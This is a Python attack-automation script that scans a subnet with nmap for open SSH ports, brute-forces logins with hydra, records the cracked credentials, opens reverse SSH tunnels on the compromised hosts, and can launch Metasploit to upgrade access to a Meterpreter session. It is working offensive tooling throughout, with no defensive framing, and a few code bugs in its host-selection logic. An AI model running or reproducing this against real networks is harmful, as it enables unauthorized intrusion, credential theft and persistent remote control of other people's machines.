#!/usr/bin/env python3

import argparse
import nmap
import os
import subprocess
import pexpect
import tempfile

# list of IPs with ssh port open
ssh_hosts = []

# Verbosity flag
global verbose
verbose = False

# Exploit mode flag
global exploit
exploit = False


def get_args():
    parser = argparse.ArgumentParser(description="Automates creation of reverse SSH tunnels.")
    parser.add_argument("subnet",
                        help="IP address(es) of host(s) to attack.",
                        type=str)
    parser.add_argument("-l",
                        help="Username for SSH login",
                        type=str,
                        metavar="username",
                        dest="username")
    parser.add_argument("-L",
                        help="List of usernames for use in bruteforcing SSH credentials",
                        type=str,
                        metavar="file",
                        dest="user_file")
    parser.add_argument("-p",
                        help="Password for SSH login",
                        type=str,
                        metavar="password",
                        dest="password")
    parser.add_argument("-P",
                        help="List of passwords for use in bruteforcing SSH credentials",
                        type=str,
                        metavar="file",
                        dest="pass_file")
    parser.add_argument("-v",
                        help="Verbose mode",
                        action="store_true")
    parser.add_argument("-o",
                        "--output",
                        help="Name of file to output found SSH credentials to",
                        type=str,
                        metavar="file",
                        dest="output")
    parser.add_argument("-pt",
                        "--port",
                        help="Port number to use in SSH tunnel",
                        type=str,
                        metavar="number",
                        dest="port")
    parser.add_argument("-rh",
                        "--remote-host",
                        help="Remote host to forward connections to",
                        type=str,
                        metavar="ip",
                        dest="remote_host")
    parser.add_argument("-e",
                        help="Establish Meterpreter session for a host after tunnel creation",
                        action="store_true")
    return parser.parse_args()


# set default arguments
def set_args(args):
    if args.v:
        global verbose
        verbose = True
    if args.username is None:
        if verbose: print("Setting username to root")
        args.username = "root"
    if args.password is None:
        if verbose: print("Setting password to password")
        args.password = "password"
    if args.output is None:
        if verbose: print("No output file specified. Found credentials will " +
                          "be outputted to console.")
    if args.port is None:
        if verbose: print("No port specified. Setting port to 22223")
        args.port = "22223"
    if args.remote_host is None:
        if verbose: print("No remote host specified. Using localhost")
        args.remote_host = "localhost"
    if args.e:
        global exploit
        exploit = True


# performs nmap scan
def nmap_scan(subnet):
    # scan the subnetwork for ssh port
    if verbose: print("Nmap scan on subnet: " + subnet)
    nm_scan = nmap.PortScanner()
    nm_scan.scan(subnet, '22')

    # print hosts discovered and states
    if verbose: print("Number of hosts found: " + str(len(nm_scan.all_hosts())))
    for host in nm_scan.all_hosts():
        if nm_scan[host]['tcp'][22]['state'] == 'open':
            print('Host : %s (%s)' % (host, nm_scan[host].hostname()))
            print('State : %s' % nm_scan[host].state())
            # grab all the hosts and store them in a list so hydra can be used on them
            ssh_hosts.append(host)


# perform hydra on list of hosts obtained from nmap
def hydra_crack(host_ip, username="root", user_file=None, password="password",
                pass_file=None, output=None):
    user_option = ""
    pass_option = ""

    if user_file is None:
        if verbose: print("No user file specified")
        user_option = "-l " + username
    else:
        if verbose: print("Using user file: " + user_file)
        user_option = "-L " + user_file

    if pass_file is None:
        if verbose: print("No password file specified")
        pass_option = "-p " + password
    else:
        if verbose: print("Using password file: " + pass_file)
        pass_option = "-P " + pass_file

    cmd = "hydra " + user_option + " " + pass_option + " " + host_ip + " ssh"
    print(cmd)

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = str(e.output)

    # find username and password in hydra output
    for row in output.split('\\n'):
        if 'host: ' + host_ip in row:
            user_pass = row.split("login:")[1].split("password:")
            res_username = user_pass[0].strip()
            res_password = user_pass[1].strip()
            if verbose: print("Found username=" + res_username + " and password=" + res_password)
            return res_username, res_password


# outputs all hosts and their credentials to console
def print_creds(credentials):
    print("Found the following credentials:")
    for host in ssh_hosts:
        creds = credentials[host]
        if creds is not None:
            print("Host: " + host + "\t" + creds[0] + ":" + creds[1])


# output all hosts and their credentials to file
def save_creds_to_file(file, credentials):
    if verbose: print("Saving credentials to file")
    with open(file, "w+") as f:
        for host in ssh_hosts:
            creds = credentials[host]
            if creds is not None:
                f.write("Host: " + host + "\t" + creds[0] + ":" + creds[1])


# Creates reverse ssh tunnel between two hosts
def create_reverse_ssh_tunnel(ssh_host, ssh_user, ssh_pass, timeout=45, port="22223", host="localhost"):
    _, fname = tempfile.mkstemp()
    fout = open(fname, 'wb')

    ssh_cmd = 'ssh -f -N -R %s:%s:%s %s@%s' % (port, host, port, ssh_user, ssh_host)
    child = pexpect.spawn(ssh_cmd, timeout=timeout)
    child.expect(['password: '])
    child.sendline(ssh_pass)
    child.logfile = fout
    child.expect(pexpect.EOF)
    child.close()
    fout.close()

    fin = open(fname, 'r')
    stdout = fin.read()
    fin.close()

    if 0 != child.exitstatus:
        raise Exception(stdout)

    return stdout


# creates meterpreter session on host
def exploit_host(ssh_host, ssh_user, ssh_pass, lport):
    cmd = "msfconsole -x \" use auxiliary/scanner/ssh/ssh_login; " \
          "set RHOSTS " + ssh_host + "; " \
          "set USERNAME " + ssh_user + "; " \
          "set PASSWORD " + ssh_pass + "; " \
          "exploit;" \
          "use post/multi/manage/shell_to_meterpreter;" \
          "set LHOST 127.0.0.1;" \
          "set LPORT " + lport + ";" \
          "set SESSION 1;" \
          "exploit;\""
    os.system(cmd)


def main():
    args = get_args()
    set_args(args)

    # find hosts
    if verbose: print("Scanning for hosts with open SSH ports.")
    nmap_scan(args.subnet)

    # find SSH credentials for hosts
    if verbose: print("Finding credentials for discovered hosts.")
    ssh_creds = dict()
    for host in ssh_hosts:
        if verbose: print("Current host: " + host)
        user_pass = hydra_crack(host, username=args.username, user_file=args.user_file,
                                password=args.password, pass_file=args.pass_file,
                                output=args.output)
        ssh_creds[host] = user_pass

    # output found SSH credentials
    if args.output is None:
        print_creds(ssh_creds)
    else:
        save_creds_to_file(args.output, ssh_creds)

    # create reverse SSH tunnels
    for host in ssh_hosts:
        creds = ssh_creds[host]
        if creds is not None:
            ssh_user = creds[0]
            ssh_pass = creds[1]
            if verbose: print("Creating SSH tunnel for host " + host)
            create_reverse_ssh_tunnel(host, ssh_user, ssh_pass, port=args.port, host=args.remote_host)

    # output list of hosts
    print("SSH tunnels were created for the following hosts:")
    index = 1
    for host in ssh_hosts:
        print(str(index) + ". " + host)
        index = index + 1

    if exploit:
        host_chosen = None
        if len(ssh_hosts) == 1:
            print("Single host available for exploit.")
            host_chosen = ssh_hosts[0]
        else:
            while True:
                num = input("Select a host from the list above to launch a Meterpreter session on: ")
                if num not in range(1, len(ssh_hosts) + 1):
                    print("Invalid input. Please enter a number from the list above (ex. 1).")
                    continue
                else:
                    host_chosen = ssh_hosts[int(num) - 1]

        print("Launching Meterpreter session for host: " + host_chosen)
        cred = ssh_creds[host_chosen]
        if cred is not None:
            ssh_user = creds[0]
            ssh_pass = creds[1]
            exploit_host(host_chosen, ssh_user, ssh_pass, args.port)

    exit(0)


if __name__ == '__main__':
    main()
